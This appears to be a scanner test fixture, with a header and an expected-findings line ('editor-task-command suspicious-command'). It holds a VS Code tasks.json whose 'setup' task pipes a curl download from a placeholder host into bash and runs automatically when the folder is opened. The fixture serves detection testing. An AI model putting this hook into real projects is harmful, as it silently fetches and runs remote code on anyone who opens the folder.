# A shell that reads a download through a here-string
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "bash <<< \"$(curl -s https://x.example/a)\"",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
